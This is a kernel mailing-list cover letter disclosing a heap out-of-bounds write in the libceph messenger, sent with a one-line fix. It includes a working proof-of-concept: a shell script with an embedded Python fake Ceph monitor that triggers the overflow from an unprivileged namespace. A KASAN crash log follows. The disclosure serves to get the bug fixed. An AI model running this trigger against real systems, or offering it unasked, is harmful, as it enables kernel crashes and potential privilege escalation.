Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 517D5370D79
	for <ceph-devel@vger.kernel.org>; Fri,  2 Oct 2026 07:09:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790924964; cv=none; b=EdPwKLUblm7vAPDUnDeel6IAeHAjtWmBAJbWNYnSTllkUXbAk9/bEWakorZoUckzlRTDSfo4zi2L8md70z8FcjI0UhuqT8MiEK3VrAhyFBVe/E8dfysxULEKBtsgA4ddFw3QTTvXSDYAl9g9Tpu2Kupe7Mn0VWtvtWGq68iWWXI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790924964; c=relaxed/simple;
	bh=HPW67aOMd+aDjXMrxfV5NFjZzTbHzUAEVqE/3c98HOc=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=ax/skS1I5Ip0MjUHrCutCLuKVeiBtS6Blo4YtqxCnI9vQL/IEV7E69mF/GJN3PHtEot28YlfIa5Y6K+N9aHsM1BmdwtrnXPOwx+tso3AdA7NiIhilCH8Hn3Xbjg1Pb4OQte6xN5R0clH5JPdNzUugLv6vuR5qYRTdlnUCK1ZsJc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=BtUvX2xO; arc=none smtp.client-ip=74.125.227.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="BtUvX2xO"
Received: by mail-pj2-f12.google.com with SMTP id 98e67ed59e1d1-396ccda24afso3746144a91.3
        for <ceph-devel@vger.kernel.org>; Fri, 02 Oct 2026 00:09:22 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790924961; x=1791529761; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=xUcWjnCBqU5QMPHIh2Rtwtdhqp/zUiDUOIwfJMT1f1Y=;
        b=BtUvX2xOZh7yHDfMCSTmn2CM7/IhxAJCdJTfLrCupN0pK2hmXLXSrpTPsmsqNB5Qj2
         4XRwFjgc8C91WBwFRvS2Mph/om0+c0brv/jOAoAK/fB2NwML+YsXGMd4GpTIhD1V6li8
         f2MS6Y3d88RutH639lMT1H7MXa9tV0kwuB7TGbbAg5NqOxmAvlUHjJvVvkP06UGSfkOE
         4edI9V02m8b9JosQYYtM4n6khJQEMa/cOz5MsaJMl9UanD9ZcSEPPA3ZpqKbsc3+dN8R
         5ReLcArFD1NtdWhfS+vtZG5OOveSxpkG/09915t8nQ549VKeGaEfSy5tQMQ3NUIp0Ch5
         3Npw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790924961; x=1791529761;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=xUcWjnCBqU5QMPHIh2Rtwtdhqp/zUiDUOIwfJMT1f1Y=;
        b=m8ZP2jAhklP92grGEswxyxsayMdHXJ5xm+qShcaXrT/KVKjTzx5DOIp6Tre+f4P0N+
         jhklr4Fr+7lIN2cMoke+B6ngFy81bY1XeFBMsOIcNXzILaQZmHviwnmu6rAeqY/U+vc3
         ONL+BPHga+Z/yFmUrVPghIVmgiDrXB8/UMDfGgtCsO7ikmPG6l0YLQ+653ADSoWmkZh4
         nk54DPZAFagKv4x7cEQ+2t4eoEnowkOpa6gzdbjKf4TsMyhNQ9THXPfjc2LCYpxs/0GI
         LmjwCGRORkYFIza5q9bAV14I5IOpzp2mbFqz/Q9uSXVh7T6lZ6E2nvLAtZfEk/ESFDSX
         +cDA==
X-Gm-Message-State: AFq9FYIi6f3AKasB78FDlL/BheKfzzeWtm4rE603PCgDbGGUzOip6cf0
	Gw+sk7apEUKx1hY8pSWsB/OfQ75gaOrK2BzYXABMaGlOeUgN4EZgprGsmmdQsqsyXLEO091QydY
	P6D0ZTg==
X-Gm-Gg: AYBFou3RlkGzyDH9tuPg0nilrj2KoE4uMuZ3r20ODEcbZObFvnw0Hl5rsDCpc98XjaS
	VZFmPef1BnZZp8CvfT/0zmlP97OoSs7ceA9zSm4nYQe5zTDvG6YkIiFE4YtiAZHgVAM3+p3pT39
	W7cQnFfDpd/W1DvY2vND0GdDwOk7uLx9TsNTepr8gJvqeGYB0TdSuVob0lYG6hF3kgAvQt3yTAu
	E1EnIpGj/W2uPHd/AXv0PDHllN9u0ohZBJUP880r/LoOBsPZZcjorTm4g4WpMiwKqqHrOCSSu4A
	NtBqXTsA+hit/nsjfKyFkORZe4mcEpvVkRyQN+5wBCJzxmCPlgIpjFO7JOHVB1QmLub9+780u1a
	wF+zPAtTZqAtVDdZzsj9gTzmQsihmL4KRkzc9Ym8KYq5nmkRa999bZ8J5bEpbw2JTg45YGDyyIC
	khPaLp06MqdfU2mAlOO+6JDPj3jnMHkzx6G+kMM87B/nJHxAtP2K1+H2g0gCp7AL6XOk/kO0h4y
	1q7rVHh
X-Received: by 2002:a17:90b:498b:b0:3a4:bbec:b4b4 with SMTP id 98e67ed59e1d1-3a6ce78f166mr779361a91.26.1790924961347;
        Fri, 02 Oct 2026 00:09:21 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([191.222.220.30])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a6cd5d88e4sm3051869a91.13.2026.10.02.00.09.18
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 02 Oct 2026 00:09:20 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: ceph-devel@vger.kernel.org
Cc: idryomov@gmail.com,
	amarkuze@redhat.com,
	slava@dubeyko.com,
	sage@newdream.net,
	vega@nebusec.ai,
	Ycsuun@gmail.com,
	weir@nebusec.ai
Subject: [PATCH 0/1] libceph: refresh middle buffers for incoming messages
Date: Fri,  2 Oct 2026 15:09:15 +0800
Message-ID: <cover.1790813978.git.Ycsuun@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: ceph-devel@vger.kernel.org
List-Id: <ceph-devel.vger.kernel.org>
List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Yucan Sun <Ycsuun@gmail.com>


Hi Linux kernel maintainers,

We found and validated an issue in net/ceph/messenger.c. The bug is
reachable by a non-root user via user and net namespace.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11263

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

When allocating an incoming message, the alloc_msg callback may return a
reused ceph_msg whose middle buffer was sized for an earlier message. The
messenger previously allocated a middle buffer only when msg->middle was
NULL; it did not check whether the existing buffer was large enough for the
current message's middle_len. If the new message requires a larger middle
section, the receive path can write that data past the end of the
undersized buffer, causing a heap out- of-bounds write. The fix checks the
buffer capacity and replaces it when it is too small.

Reproducer:

    unshare -Urn sh poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu
WORKDIR=/tmp/ceph-auth-reuse-poc
MNT=/mnt/cephtest
mkdir -p "$WORKDIR" "$MNT"
sysctl -w kernel.panic_on_warn=0
cat >"$WORKDIR/mon.py" <<'PY'
import os
import socket
import struct
import time
AF_INET = 2
CEPH_BANNER = b"ceph v027"
TAG_READY = 1
TAG_MSG = 7
TAG_ACK = 8
TAG_KEEPALIVE = 9
TAG_KEEPALIVE2 = 14
TYPE_MON = 1
MSG_AUTH = 17
MSG_AUTH_REPLY = 18
CEPH_AUTH_NONE = 1
FEATURE_MSG_AUTH = 1 << 23
POLY = 0x82F63B78
TABLE = []
for i in range(256):
    crc = i
    for _ in range(8):
        crc = (crc >> 1) ^ POLY if crc & 1 else crc >> 1
    TABLE.append(crc)
def crc32c(data: bytes, crc: int = 0) -> int:
    for b in data:
        crc = TABLE[(crc ^ b) & 0xFF] ^ (crc >> 8)
    return crc
def recvn(sock: socket.socket, size: int) -> bytes:
    buf = b""
    while len(buf) < size:
        chunk = sock.recv(size - len(buf))
        if not chunk:
            raise EOFError(f"short read: wanted {size}, got {len(buf)}")
        buf += chunk
    return buf
def pack_sockaddr(ip: str, port: int) -> bytes:
    head = struct.pack("!HH4s8s", AF_INET, port, socket.inet_aton(ip), b"\x00" * 8)
    return head + b"\x00" * (128 - len(head))
def banner_addr(ip: str, port: int, nonce: int = 0) -> bytes:
    return struct.pack("<II", 0, nonce) + pack_sockaddr(ip, port)
def parse_banner_addr(data: bytes) -> tuple[str, int, int]:
    nonce = struct.unpack_from("<I", data, 4)[0]
    family, port = struct.unpack_from("!HH", data, 8)
    if family == AF_INET:
        ip = socket.inet_ntoa(data[12:16])
    else:
        ip = f"family-{family}"
    return ip, port, nonce
def recv_connect(sock: socket.socket) -> dict[str, int]:
    data = recvn(sock, 33)
    vals = struct.unpack("<QIIIIIIB", data)
    return {
        "features": vals[0],
        "host_type": vals[1],
        "global_seq": vals[2],
        "connect_seq": vals[3],
        "protocol_version": vals[4],
        "authorizer_protocol": vals[5],
        "authorizer_len": vals[6],
        "flags": vals[7],
    }
def pack_connect_reply(features: int, connect_seq: int) -> bytes:
    return struct.pack("<BQIIIIB", TAG_READY, features, 1, connect_seq, 15, 0, 0)
def pack_msg_header(seq: int, tid: int, msg_type: int, front_len: int,
                    middle_len: int, data_len: int, src_type: int = TYPE_MON,
                    src_num: int = 0, priority: int = 127, version: int = 0,
                    data_off: int = 0, compat: int = 0, reserved: int = 0) -> bytes:
    prefix = struct.pack(
        "<QQHHHIIIHBQHH",
        seq,
        tid,
        msg_type,
        priority,
        version,
        front_len,
        middle_len,
        data_len,
        data_off,
        src_type,
        src_num,
        compat,
        reserved,
    )
    return prefix + struct.pack("<I", crc32c(prefix))
def pack_footer(features: int, front: bytes, middle: bytes, data: bytes = b"") -> bytes:
    if features & FEATURE_MSG_AUTH:
        return struct.pack("<IIIQB", crc32c(front), crc32c(middle), crc32c(data), 0, 1)
    return struct.pack("<IIIB", crc32c(front), crc32c(middle), crc32c(data), 1)
def send_msg(sock: socket.socket, features: int, seq: int, tid: int, msg_type: int,
             front: bytes, middle: bytes = b"", data: bytes = b"") -> None:
    header = pack_msg_header(seq, tid, msg_type, len(front), len(middle), len(data))
    footer = pack_footer(features, front, middle, data)
    sock.sendall(bytes([TAG_MSG]) + header + front + middle + data + footer)
def recv_one_msg(sock: socket.socket) -> tuple[dict[str, int], bytes]:
    header = recvn(sock, 53)
    vals = struct.unpack("<QQHHHIIIHBQHHI", header)
    info = {
        "seq": vals[0],
        "tid": vals[1],
        "type": vals[2],
        "priority": vals[3],
        "version": vals[4],
        "front_len": vals[5],
        "middle_len": vals[6],
        "data_len": vals[7],
        "data_off": vals[8],
        "src_type": vals[9],
        "src_num": vals[10],
        "compat": vals[11],
        "reserved": vals[12],
        "crc": vals[13],
    }
    front = recvn(sock, info["front_len"])
    if info["middle_len"]:
        recvn(sock, info["middle_len"])
    if info["data_len"]:
        recvn(sock, info["data_len"])
    recvn(sock, 13)
    return info, front
def recv_until_auth(sock: socket.socket) -> tuple[dict[str, int], bytes]:
    while True:
        tag = recvn(sock, 1)[0]
        print(f"tag={tag}", flush=True)
        if tag == TAG_KEEPALIVE:
            continue
        if tag == TAG_KEEPALIVE2:
            recvn(sock, 8)
            continue
        if tag == TAG_ACK:
            ack = struct.unpack("<Q", recvn(sock, 8))[0]
            print(f"ack={ack}", flush=True)
            continue
        if tag != TAG_MSG:
            raise RuntimeError(f"unexpected tag {tag}")
        info, front = recv_one_msg(sock)
        print(f"msg type={info['type']} seq={info['seq']} tid={info['tid']} front={info['front_len']} middle={info['middle_len']} data={info['data_len']}", flush=True)
        if info["type"] == MSG_AUTH:
            return info, front
def auth_reply_front(global_id: int = 0x1234) -> bytes:
    return (
        struct.pack("<I", CEPH_AUTH_NONE) +
        struct.pack("<i", 0) +
        struct.pack("<Q", global_id) +
        struct.pack("<I", 0) +
        struct.pack("<I", 0)
    )
lsock = socket.socket()
lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
lsock.bind(("127.0.0.1", 6789))
lsock.listen(8)
print("listening on 127.0.0.1:6789", flush=True)
for idx, middle_len in enumerate((8, 4096), start=1):
    csock, addr = lsock.accept()
    print(f"accepted #{idx} from {addr[0]}:{addr[1]}", flush=True)
    try:
        banner = recvn(csock, len(CEPH_BANNER))
        actual = recvn(csock, 136)
        print(f"client banner={banner!r} actual={parse_banner_addr(actual)}", flush=True)
        csock.sendall(
            CEPH_BANNER +
            banner_addr("127.0.0.1", 6789, 0) +
            banner_addr(addr[0], addr[1], 0)
        )
        conn = recv_connect(csock)
        print(f"connect={conn}", flush=True)
        if conn["authorizer_len"]:
            recvn(csock, conn["authorizer_len"])
        csock.sendall(pack_connect_reply(conn["features"], conn["connect_seq"] + 1))
        info, front = recv_until_auth(csock)
        print(f"auth front={front.hex()}", flush=True)
        middle = b"A" * middle_len
        send_msg(csock, conn["features"], 1, info["tid"], MSG_AUTH_REPLY, auth_reply_front(), middle)
        print(f"sent auth reply #{idx} middle_len={middle_len}", flush=True)
        time.sleep(1 if idx == 1 else 30)
    finally:
        csock.close()
lsock.close()
print("server finished", flush=True)
PY
python3 -u "$WORKDIR/mon.py" >"$WORKDIR/server.log" 2>&1 &
server_pid=$!
trap 'kill "$server_pid" 2>/dev/null || true; umount "$MNT" 2>/dev/null || true' EXIT
sleep 1
mount -i -t ceph 127.0.0.1:6789:/ "$MNT" -o name=guest,ms_mode=legacy,mount_timeout=60

------END poc.sh--------

----BEGIN crash log----

[  243.149071] [    T803] BUG: KASAN: slab-out-of-bounds in _copy_to_iter+0x782/0x11f0
[  243.149169] [    T803] Write of size 4096 at addr ffff88810a3abd88 by task kworker/3:2/803
[  243.149217] [    T803] CPU: 3 UID: 0 PID: 803 Comm: kworker/3:2 Not tainted 6.12.95 #2
[  243.149261] [    T803] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  243.149267] [    T803] Workqueue: ceph-msgr ceph_con_workfn
[  243.149343] [    T803] Call Trace:
[  243.149365] [    T803]  <TASK>
[  243.149380] [    T803]  dump_stack_lvl+0x78/0xe0
[  243.149419] [    T803]  print_report+0xc6/0x620
[  243.149461] [    T803]  ? _copy_to_iter+0x782/0x11f0
[  243.149471] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.149496] [    T803]  ? __virt_addr_valid+0x1f3/0x3d0
[  243.149536] [    T803]  ? _copy_to_iter+0x782/0x11f0
[  243.149546] [    T803]  kasan_report+0xd8/0x110
[  243.149562] [    T803]  ? _copy_to_iter+0x782/0x11f0
[  243.149583] [    T803]  kasan_check_range+0xf4/0x1a0
[  243.149606] [    T803]  __asan_memcpy+0x3c/0x60
[  243.149622] [    T803]  _copy_to_iter+0x782/0x11f0
[  243.149640] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.149649] [    T803]  ? lock_acquire+0x2f/0xb0
[  243.149708] [    T803]  ? __virt_addr_valid+0x117/0x3d0
[  243.149717] [    T803]  ? __pfx__copy_to_iter+0x10/0x10
[  243.149731] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.149740] [    T803]  ? __virt_addr_valid+0x1f3/0x3d0
[  243.149753] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.149761] [    T803]  ? __check_object_size+0x2eb/0x4f0
[  243.149787] [    T803]  ? __lock_acquire+0x1249/0x3c40
[  243.149806] [    T803]  __skb_datagram_iter+0x402/0x7c0
[  243.149850] [    T803]  ? __pfx_simple_copy_to_iter+0x10/0x10
[  243.149867] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.149874] [    T803]  ? rcu_is_watching+0x12/0xc0
[  243.149913] [    T803]  skb_copy_datagram_iter+0x3d/0x50
[  243.149930] [    T803]  tcp_recvmsg_locked+0x1536/0x2220
[  243.149995] [    T803]  ? __pfx_tcp_recvmsg_locked+0x10/0x10
[  243.150009] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.150018] [    T803]  ? tcp_recvmsg+0xe4/0x540
[  243.150030] [    T803]  ? __local_bh_enable_ip+0xa7/0x120
[  243.150068] [    T803]  tcp_recvmsg+0xfd/0x540
[  243.150077] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.150087] [    T803]  ? __pfx_tcp_recvmsg+0x10/0x10
[  243.150097] [    T803]  ? __pfx___might_resched+0x10/0x10
[  243.150132] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.150139] [    T803]  ? aa_sk_perm+0x1d8/0x8d0
[  243.150179] [    T803]  inet_recvmsg+0x109/0x510
[  243.150199] [    T803]  ? __pfx_crc32c+0x10/0x10
[  243.150223] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.150232] [    T803]  ? __pfx_inet_recvmsg+0x10/0x10
[  243.150253] [    T803]  ? __pfx_inet_recvmsg+0x10/0x10
[  243.150262] [    T803]  sock_recvmsg+0x148/0x190
[  243.150282] [    T803]  ceph_tcp_recvmsg+0xd0/0x120
[  243.150310] [    T803]  ? __pfx_ceph_tcp_recvmsg+0x10/0x10
[  243.150343] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.150366] [    T803]  ? ceph_msg_get+0x24/0xf0
[  243.150381] [    T803]  read_partial_message_chunk+0xa9/0x240
[  243.150403] [    T803]  ceph_con_v1_try_read+0x1654/0x6200
[  243.150434] [    T803]  ? ceph_con_workfn+0x48/0xf20
[  243.150446] [    T803]  ? __pfx___mutex_lock+0x10/0x10
[  243.150479] [    T803]  ? __pfx_ceph_con_v1_try_read+0x10/0x10
[  243.150497] [    T803]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  243.150507] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.150513] [    T803]  ? rcu_is_watching+0x12/0xc0
[  243.150533] [    T803]  ceph_con_workfn+0x791/0xf20
[  243.150552] [    T803]  process_one_work+0x855/0x1ac0
[  243.150588] [    T803]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  243.150599] [    T803]  ? __pfx_process_one_work+0x10/0x10
[  243.150623] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.150638] [    T803]  worker_thread+0x4f4/0xd60
[  243.150652] [    T803]  ? lockdep_hardirqs_on+0x7b/0x110
[  243.150683] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.150692] [    T803]  ? srso_alias_return_thunk+0x5/0xfbef5
[  243.150698] [    T803]  ? __kthread_parkme+0xb0/0x1d0
[  243.150715] [    T803]  ? __pfx_worker_thread+0x10/0x10
[  243.150729] [    T803]  ? __pfx_worker_thread+0x10/0x10
[  243.150738] [    T803]  kthread+0x27e/0x350
[  243.150744] [    T803]  ? _raw_spin_unlock_irq+0x28/0x50
[  243.150754] [    T803]  ? __pfx_kthread+0x10/0x10
[  243.150764] [    T803]  ret_from_fork+0x31/0x70
[  243.150791] [    T803]  ? __pfx_kthread+0x10/0x10
[  243.150800] [    T803]  ret_from_fork_asm+0x1a/0x30
[  243.150845] [    T803]  </TASK>
[  243.151013] [    T803] Allocated by task 9:
[  243.151029] [    T803]  kasan_save_stack+0x33/0x60
[  243.151044] [    T803]  kasan_save_track+0x14/0x30
[  243.151057] [    T803]  __kasan_kmalloc+0xaa/0xb0
[  243.151069] [    T803]  __kmalloc_node_noprof+0x1f1/0x430
[  243.151092] [    T803]  ceph_buffer_new+0x89/0x1f0
[  243.151106] [    T803]  ceph_con_in_msg_alloc+0x340/0x510
[  243.151119] [    T803]  ceph_con_v1_try_read+0x1c1a/0x6200
[  243.151132] [    T803]  ceph_con_workfn+0x791/0xf20
[  243.151144] [    T803]  process_one_work+0x855/0x1ac0
[  243.151157] [    T803]  worker_thread+0x4f4/0xd60
[  243.151169] [    T803]  kthread+0x27e/0x350
[  243.151180] [    T803]  ret_from_fork+0x31/0x70
[  243.151191] [    T803]  ret_from_fork_asm+0x1a/0x30
[  243.151226] [    T803] The buggy address belongs to the object at ffff88810a3abd88
                           which belongs to the cache kmalloc-8 of size 8
[  243.151243] [    T803] The buggy address is located 0 bytes inside of
                           allocated 8-byte region [ffff88810a3abd88, ffff88810a3abd90)
[  243.151276] [    T803] The buggy address belongs to the physical page:
[  243.151291] [    T803] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0xffff88810a3ab1b8 pfn:0x10a3ab
[  243.151310] [    T803] flags: 0x17ff00000000200(workingset|node=0|zone=2|lastcpupid=0x7ff)
[  243.151336] [    T803] page_type: f5(slab)
[  243.151355] [    T803] raw: 017ff00000000200 ffff888100042640 ffffea000428ce50 ffff888100040588
[  243.151368] [    T803] raw: ffff88810a3ab1b8 00000000001c001b 00000001f5000000 0000000000000000
[  243.151377] [    T803] page dumped because: kasan: bad access detected
[  243.151407] [    T803] page_owner tracks the page as allocated
[  243.152304] [    T803] page last allocated via order 0, migratetype Unmovable, gfp_mask 0x52c00(GFP_NOIO|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP), pid 1, tgid 1 (swapper/0), ts 16030482059, free_ts 16002421946
[  243.154722] [    T803]  post_alloc_hook+0x181/0x1b0
[  243.154751] [    T803]  get_page_from_freelist+0x7b0/0x3b60
[  243.154764] [    T803]  __alloc_pages_noprof+0x224/0x26d0
[  243.154777] [    T803]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  243.154801] [    T803]  new_slab+0x2e5/0x420
[  243.154814] [    T803]  ___slab_alloc+0xe60/0x19e0
[  243.154827] [    T803]  __slab_alloc.isra.0+0x5b/0xb0
[  243.154843] [    T803]  __kmalloc_cache_noprof+0x2a0/0x2f0
[  243.154859] [    T803]  usb_control_msg+0xb7/0x470
[  243.154904] [    T803]  hub_suspend+0x73c/0xa70
[  243.154926] [    T803]  usb_suspend_both+0x246/0x890
[  243.154943] [    T803]  usb_runtime_suspend+0x36/0xd0
[  243.154956] [    T803]  __rpm_callback+0xa9/0x390
[  243.155002] [    T803]  rpm_callback+0x12c/0x170
[  243.155016] [    T803]  rpm_suspend+0x231/0xe00
[  243.155027] [    T803]  __pm_runtime_suspend+0x6a/0xd0
[  243.155045] [    T803] page last free pid 1 tgid 1 stack trace:
[  243.155820] [    T803]  free_unref_page+0x6a3/0x1050
[  243.155835] [    T803]  qlist_free_all+0x54/0x120
[  243.155848] [    T803]  kasan_quarantine_reduce+0x192/0x1e0
[  243.155860] [    T803]  __kasan_slab_alloc+0x69/0x90
[  243.155873] [    T803]  __kmalloc_cache_noprof+0x10b/0x2f0
[  243.155885] [    T803]  usb_hub_create_port_device+0x74/0xe00
[  243.155907] [    T803]  hub_probe+0x1c38/0x3030
[  243.155919] [    T803]  usb_probe_interface+0x281/0x880
[  243.155931] [    T803]  really_probe+0x1ca/0x920
[  243.155956] [    T803]  __driver_probe_device+0x316/0x440
[  243.155968] [    T803]  driver_probe_device+0x4a/0x120
[  243.155980] [    T803]  __device_attach_driver+0x162/0x270
[  243.155992] [    T803]  bus_for_each_drv+0x115/0x1a0
[  243.156011] [    T803]  __device_attach+0x199/0x3b0
[  243.156023] [    T803]  bus_probe_device+0x133/0x180
[  243.156037] [    T803]  device_add+0xe5e/0x1680
[  243.156059] [    T803] Memory state around the buggy address:
[  243.156069] [    T803]  ffff88810a3abc80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc 00
[  243.156080] [    T803]  ffff88810a3abd00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  243.156108] [    T803] >ffff88810a3abd80: fc 00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  243.156117] [    T803]                          ^
[  243.156127] [    T803]  ffff88810a3abe00: fc fc fc 02 fc fc fc fc fc fc fc fc fc fc fc fc
[  243.156138] [    T803]  ffff88810a3abe80: fc fc fc fc fc 07 fc fc fc fc fc fc fc fc fc fc

-----END crash log-----

Best regards,
<Yucan Sun>


Yucan Sun (1):
  libceph: refresh middle buffers for incoming messages

 net/ceph/messenger.c | 6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)

-- 
2.53.0

